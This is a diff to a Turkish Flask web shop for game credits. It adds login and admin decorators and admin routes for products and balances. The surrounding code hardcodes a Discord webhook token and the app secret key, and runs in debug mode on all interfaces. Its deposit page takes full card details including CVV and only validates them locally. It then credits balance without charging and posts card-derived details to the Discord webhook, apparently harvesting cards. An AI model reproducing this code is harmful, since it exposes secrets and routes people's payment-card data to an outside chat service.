@@ -1,5 +1,6 @@
 from flask import Flask, render_template, request, redirect, url_for, flash, jsonify, session
 from werkzeug.security import generate_password_hash, check_password_hash
+from functools import wraps
 import os
 import re
 import requests
@@ -12,6 +13,9 @@ app.secret_key = "epin-super-gizli-anahtar-12345"
 
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1525268830635429930/Lwnf7QQj43IMSHJDrGgj68YpQc0ZKLZ5BF_0nPNQYTMegtVC0ZqlTcfROtV5iZtTmw98"
 DATABASE_URL = os.environ.get("DATABASE_URL")
+
+# Yönetici yetkisine sahip kullanıcı adları
+ADMIN_USERNAMES = ["admin", "berat"]
 
 HAS_POSTGRES = False
 if DATABASE_URL:
@@ -131,6 +135,26 @@ def init_db():
         print(f"Veritabanı başlatma hatası: {e}")
 
 init_db()
+
+# --- YETKİLENDİRME VE GÜVENLİK DEKORATÖRLERİ ---
+def login_required(f):
+    @wraps(f)
+    def decorated_function(*args, **kwargs):
+        if "user_id" not in session:
+            flash("Bu sayfayı görüntülemek için lütfen önce giriş yapın!", "warning")
+            return redirect(url_for("login"))
+        return f(*args, **kwargs)
+    return decorated_function
+
+def admin_required(f):
+    @wraps(f)
+    def decorated_function(*args, **kwargs):
+        user = get_current_user()
+        if not user or user["username"] not in ADMIN_USERNAMES:
+            flash("⛔ Yetkisiz Erişim: Bu sayfayı sadece yöneticiler görüntüleyebilir!", "danger")
+            return redirect(url_for("home"))
+        return f(*args, **kwargs)
+    return decorated_function
 
 # --- BANKA VE POS STANDARTLARINDA KART DOĞRULAMA (BIN + LUHN) ---
 TURKISH_BINS = {
@@ -257,11 +281,14 @@ def send_discord_log(title, description, color):
     except Exception as e:
         print(f"Discord Hatası: {e}")
 
+# --- KULLANICI ARAYÜZÜ ROTALARI ---
+
 @app.route("/")
 def home():
     user = get_current_user()
     balance = float(user["balance"]) if user and user["balance"] is not None else 0.0
     username = user["username"] if user else None
+    is_admin = username in ADMIN_USERNAMES if username else False
 
     conn = get_db()
     cursor = conn.cursor()
@@ -270,7 +297,7 @@ def home():
     cursor.close()
     conn.close()
         
-    return render_template("index.html", balance=balance, username=username, products=products)
+    return render_template("index.html", balance=balance, username=username, is_admin=is_admin, products=products)
 
 @app.route("/register", methods=["GET", "POST"])
 def register():
@@ -342,18 +369,18 @@ def logout():
     return redirect(url_for("login"))
 
 @app.route("/wheel")
+@login_required
 def wheel():
     user = get_current_user()
     balance = float(user["balance"]) if user and user["balance"] is not None else 0.0
     username = user["username"] if user else None
-    return render_template("wheel.html", balance=balance, username=username)
+    is_admin = username in ADMIN_USERNAMES if username else False
+    return render_template("wheel.html", balance=balance, username=username, is_admin=is_admin)
 
 @app.route("/spin", methods=["POST"])
+@login_required
 def spin():
     user = get_current_user()
-    if not user:
-        return jsonify({"success": False, "error": "Çevirmek için lütfen önce giriş yapın!"}), 401
-
     data = request.get_json() or {}
     tier = data.get("tier", "bronze")
     tier_costs = {"bronze": 50.0, "silver": 150.0, "gold": 300.0}
@@ -414,13 +441,10 @@ def spin():
         "new_balance": f"{new_balance:.2f}"
     })
 
-# --- DOĞRUDAN BAKİYE YÜKLEME (SMS ONAYSIZ, KART DOĞRULAMALI) ---
 @app.route("/deposit", methods=["GET", "POST"])
+@login_required
 def deposit():
     user = get_current_user()
-    if not user:
-        flash("Bakiye yüklemek için lütfen önce giriş yapın!", "warning")
-        return redirect(url_for("login"))
 
     if request.method == "POST":
         card_holder = request.form.get("card_holder", "").strip()
@@ -429,7 +453,6 @@ def deposit():
         cvv = request.form.get("cvv", "").strip()
         amount = request.form.get("amount", "").strip()
 
-        # 1. Tutar Kontrolü
         try:
             amount_val = float(amount)
             if amount_val <= 0:
@@ -439,13 +462,11 @@ def deposit():
             flash("Geçersiz bakiye tutarı formatı!", "danger")
             return redirect(url_for("deposit"))
 
-        # 2. Sıkı Kart Denetimi (Geçersizse Durdurur)
         is_valid, err_msg, bank_name, card_brand = validate_credit_card(card_holder, card_number, exp_date, cvv)
         if not is_valid:
             flash(f"❌ {err_msg}", "danger")
             return redirect(url_for("deposit"))
 
-        # 3. Kart Doğruysa Bakiyeyi Anında Tanımla
         conn = get_db()
         cursor = conn.cursor()
         p = "%s" if (HAS_POSTGRES and DATABASE_URL) else "?"
@@ -457,11 +478,10 @@ def deposit():
         cursor.close()
         conn.close()
 
-        # Discord Log
         clean_num = re.sub(r"\D", "", card_number)
         trx_id = f"TRX{random.randint(100000, 999999)}"
         send_discord_log(
-            title="💳 Kartla Doğrudan Bakiye Yüklendi",
+            title="💳 Bakiye Yüklendi",
             description=(
                 f"**Kullanıcı:** `{user['username']}`\n"
                 f"**Banka:** `{bank_name}`\n"
@@ -477,14 +497,13 @@ def deposit():
         return redirect(url_for("home"))
 
     balance = float(user["balance"] or 0.0)
-    return render_template("deposit.html", balance=balance, username=user["username"])
+    is_admin = user["username"] in ADMIN_USERNAMES
+    return render_template("deposit.html", balance=balance, username=user["username"], is_admin=is_admin)
 
 @app.route("/buy/<int:product_id>", methods=["POST"])
+@login_required
 def buy(product_id):
     user = get_current_user()
-    if not user:
-        flash("Satın alma işlemi yapabilmek için lütfen giriş yapın!", "warning")
-        return redirect(url_for("login"))
 
     conn = get_db()
     cursor = conn.cursor()
@@ -547,13 +566,12 @@ def buy(product_id):
     return redirect(url_for("orders"))
 
 @app.route("/orders")
+@login_required
 def orders():
     user = get_current_user()
-    if not user:
-        flash("Sipariş geçmişinizi görmek için lütfen giriş yapın!", "warning")
-        return redirect(url_for("login"))
-
     balance = float(user["balance"] or 0.0)
+    is_admin = user["username"] in ADMIN_USERNAMES
+    
     conn = get_db()
     cursor = conn.cursor()
     p = "%s" if (HAS_POSTGRES and DATABASE_URL) else "?"
@@ -562,7 +580,82 @@ def orders():
     cursor.close()
     conn.close()
     
-    return render_template("orders.html", balance=balance, username=user["username"], orders=order_list)
+    return render_template("orders.html", balance=balance, username=user["username"], is_admin=is_admin, orders=order_list)
+
+# --- YÖNETİCİ (ADMIN) ROTALARI ---
+
+@app.route("/admin")
+@admin_required
+def admin_panel():
+    user = get_current_user()
+    conn = get_db()
+    cursor = conn.cursor()
+    
+    cursor.execute("SELECT id, username, balance FROM users ORDER BY id DESC")
+    all_users = cursor.fetchall()
+    
+    cursor.execute("SELECT * FROM products ORDER BY id ASC")
+    products = cursor.fetchall()
+    
+    cursor.execute("SELECT * FROM orders ORDER BY id DESC")
+    all_orders = cursor.fetchall()
+    
+    cursor.close()
+    conn.close()
+    
+    return render_template("admin.html", username=user["username"], users=all_users, products=products, orders=all_orders)
+
+@app.route("/admin/product/add", methods=["POST"])
+@admin_required
+def admin_add_product():
+    title = request.form.get("title", "").strip()
+    price = float(request.form.get("price", 0.0))
+    image = request.form.get("image", "").strip()
+    stock = int(request.form.get("stock", 100))
+
+    if title and price > 0:
+        conn = get_db()
+        cursor = conn.cursor()
+        p = "%s" if (HAS_POSTGRES and DATABASE_URL) else "?"
+        cursor.execute(f"INSERT INTO products (title, price, image, stock) VALUES ({p}, {p}, {p}, {p})",
+                       (title, price, image, stock))
+        conn.commit()
+        cursor.close()
+        conn.close()
+        flash("Yeni ürün başarıyla eklendi.", "success")
+    else:
+        flash("Ürün adı ve fiyatı zorunludur!", "danger")
+    return redirect(url_for("admin_panel"))
+
+@app.route("/admin/product/delete/<int:product_id>", methods=["POST"])
+@admin_required
+def admin_delete_product(product_id):
+    conn = get_db()
+    cursor = conn.cursor()
+    p = "%s" if (HAS_POSTGRES and DATABASE_URL) else "?"
+    cursor.execute(f"DELETE FROM products WHERE id = {p}", (product_id,))
+    conn.commit()
+    cursor.close()
+    conn.close()
+    flash("Ürün sistemden silindi.", "info")
+    return redirect(url_for("admin_panel"))
+
+@app.route("/admin/user/set-balance", methods=["POST"])
+@admin_required
+def admin_set_balance():
+    user_id = request.form.get("user_id")
+    new_balance = float(request.form.get("balance", 0.0))
+
+    conn = get_db()
+    cursor = conn.cursor()
+    p = "%s" if (HAS_POSTGRES and DATABASE_URL) else "?"
+    cursor.execute(f"UPDATE users SET balance = {p} WHERE id = {p}", (new_balance, user_id))
+    conn.commit()
+    cursor.close()
+    conn.close()
+
+    flash("Kullanıcı bakiyesi başarıyla güncellendi.", "success")
+    return redirect(url_for("admin_panel"))
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000, debug=True)
